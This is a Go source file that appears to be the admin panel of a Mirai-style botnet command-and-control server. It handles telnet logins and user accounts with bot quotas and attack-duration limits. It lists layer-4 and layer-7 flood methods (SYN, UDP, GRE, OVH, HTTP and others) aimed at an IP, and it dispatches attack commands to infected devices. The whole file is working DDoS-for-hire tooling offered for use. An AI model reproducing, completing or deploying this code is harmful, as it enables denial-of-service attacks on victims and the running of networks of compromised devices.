package main 

import
(
	"fmt"
	"net"
	"time"
	"strings"
	"strconv"
	"os"
	"log"
)

var text string
var strRemoteAddr string

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

	this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[1;94mUsername\x1b[1;0m: "))
	username, err := this.ReadLine(false)
    if err != nil {
        return
    }

	// Get Password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[1;96mPassword\x1b[1;0m: "))
	password, err := this.ReadLine(false)
    if err != nil {
        return
    }

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
        i := 0
        for {
            var botCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                botCount = userInfo.maxBots
            } else {
                botCount = clientList.Count()
            }

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Devices: %d\007", botCount))); err != nil {
                this.conn.Close()
                break
		}
		i++
		if i % 60 == 0 {
			this.conn.SetDeadline(time.Now().Add(120 * time.Second))
		}
	}
}()
this.conn.Write([]byte("\033[2J\033[1H"))
for {
	var botCatagory string
	var botCount int
	this.conn.Write([]byte("\x1b[1;97m[\x1b[1;96mbot\x1b[1;94mnet\x1b[1;97m]~\x1b[1;0m "))
	cmd, err := this.ReadLine(false)
    

	if cmd == "clear" || cmd == "cls" || cmd == "CLEAR" {
		this.conn.Write([]byte("\033[2J\033[1H"))
		continue
	}

	if cmd == "help" || cmd == "HELP" || cmd == "?" {
		this.conn.Write([]byte("\x1b[1;92m. . . : : : | \x1b[1;97mHelp Center \x1b[1;92m| : : : . . .\r\n"))
		this.conn.Write([]byte("\x1b[1;96m L4   \x1b[1;97mLayer \x1b[1;92m4 \x1b[1;97mAttacks Methods\r\n"))
		this.conn.Write([]byte("\x1b[1;94m L7   \x1b[1;97mLayer \x1b[1;92m7 \x1b[1;97mAttacks Methods\r\n"))
		this.conn.Write([]byte("\x1b[1;96m MANAGE ATTACKS       \x1b[1;92mEnable\x1b[1;0m or \x1b[92mDisable\x1b[1;0m attacks\r\n"))
		this.conn.Write([]byte("\x1b[1;97m\r\n"))
		continue
	}

	if cmd == "l4" || cmd == "L4" {
	this.conn.Write([]byte("\x1b[1;92m. . . : : : | \x1b[1;97mTCP Methods \x1b[1;92m| : : : . . .  . . . : : | \x1b[1;97mUDP Methods \x1b[1;92m| : : : . . .\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !tcp         \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 !udp         \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !tcpall      \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 !udphex      \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !tcpfrag     \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 !udprand     \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !syn         \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 !udpplain    \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !ack         \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 !vse         \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !xmas        \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 !std         \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !stomp       \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 !stdhex      \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !storm       \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !greip       \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 Just a quick reminder\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !greeth      \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 that if you \x1b[1;91mSPAM \x1b[1;97mattacks\r\n"))
	this.conn.Write([]byte("\x1b[1;97m  !ovh         \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m                 i will \x1b[1;91mSPAM \x1b[1;97myour life!\r\n"))
	this.conn.Write([]byte("\x1b[1;97m\r\n"))
	continue
	}

	if cmd == "l7" || cmd == "L7" {
		this.conn.Write([]byte("\x1b[1;92m. . . : : : | \x1b[1;97mL7 Methods \x1b[1;92m| : : : . . .\r\n"))
		this.conn.Write([]byte("\x1b[1;97m  !http \x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] [\x1b[1;37mTIME\x1b[1;91m]\x1b[1;97m domain=\x1b[1;91m[\x1b[1;37mIP\x1b[1;91m] conns=5000\r\n"))
		this.conn.Write([]byte("\x1b[1;97m\r\n"))
		continue
	}

	if err != nil || cmd == "exit" || cmd == "quit" {
		return
	}

	if cmd == "" {
		continue
	}

	if strings.Contains(cmd, "@") {
		continue
	}

	if strings.HasPrefix(cmd, "-") {
		continue
	}

	if strings.HasSuffix(cmd, "=") {
		continue
	}

	

        file, err := os.OpenFile("logs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
        if err != nil {
        log.Fatal(err)
        }

        log.SetOutput(file)

        log.Println("[nbot] Logs |->", this.conn.RemoteAddr(), username, cmd)

	botCount = userInfo.maxBots

	if userInfo.admin == 1 && cmd == "adduser" {
		this.conn.Write([]byte("Enter new username: "))
		new_un, err := this.ReadLine(false)
		if err != nil {
			return
		}
		this.conn.Write([]byte("Enter new password: "))
		new_pw, err := this.ReadLine(false)
		if err != nil {
			return
		}
		this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
		max_bots_str, err := this.ReadLine(false)
		if err != nil {
			return
		}
		max_bots, err := strconv.Atoi(max_bots_str)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
			continue
		}
		this.conn.Write([]byte("Max attack duration (-1 for none): "))
		duration_str, err := this.ReadLine(false)
		if err != nil {
			return
		}
		duration, err := strconv.Atoi(duration_str)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
			continue
		}
		this.conn.Write([]byte("Cooldown time (0 for none): "))
		cooldown_str, err := this.ReadLine(false)
		if err != nil {
			return
		}
		cooldown, err := strconv.Atoi(cooldown_str)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
			continue
		}
		this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
		confirm, err := this.ReadLine(false)
		if err != nil {
			return
		}
		if confirm != "y" {
			continue
		}
		if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
		} else {
			this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
		}
		continue
	}

	if userInfo.admin == 1 && cmd == "removeuser" || cmd == "remuser" {
		this.conn.Write([]byte("Enter valid username: "))
		new_un, err := this.ReadLine(false)
		if err != nil {
			return
		}
		this.conn.Write([]byte("\x1b[1;37mRemove user: " + new_un + " \x1b[1;37mContinue?\r\n (y/N)"))
		confirm, err := this.ReadLine(false)
		if err != nil {
			return
		}
		if confirm != "y" {
			continue
		}
		if !database.RemoveUser(new_un) {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to remove user. An unknown error occured.")))
		} else {
			this.conn.Write([]byte("\033[32;1mUser removed successfully.\033[0m\r\n"))
		}
		continue
	}
	
	
	if cmd == "bots" || cmd == "BOTS" {
		botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\033[\033[38;5;93m[\033[01;35m%s\033[38;5;93m]\033[01;35m:\t\033[01;37m-\033[01;35m>\033[38;5;93m[\033[01;35m%d\033[38;5;93m]\r\n", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;93mTotal Bots: \033[38;5;93m[\033[01;35m%d\033[38;5;93m]\r\n\033[0m", botCount)))
			continue
		}

		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botCount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if userInfo.admin == 1 && cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}



		atk, err := NewAttack(cmd, userInfo.admin)
			botCount = clientList.Count()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
			} else {
				buf, err := atk.Build()
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
				} else {
					if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
						this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
					} else if !database.ContainsWhitelistedTargets(atk) {
						clientList.QueueBuf(buf, botCount, botCatagory)
						this.conn.Write([]byte(fmt.Sprintf("\x1b[1;97m    Command \x1b[1;92msucessfully\x1b[1;97m sent to \x1b[1;92m%d \x1b[1;97mDevices!\r\n", botCount)))
					} else {
						fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
					}
				}
			}
		}
	}


func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1000)
	bufPos := 0
	for {
		if len(buf) < bufPos+2 {
			fmt.Println("\033[0mOver Exceded Buf:", len(buf))
			fmt.Println("\033[0mTry to CNC Crash IP:", this.conn.RemoteAddr()) // anti crashing + buffer protection so github python skids wont fuck us with their python crashers and db leakers!
			return string(buf), nil
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\033[0m\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("\033[00;1;36m\033[0m\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("\033[00;1;95mx\033[0m"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
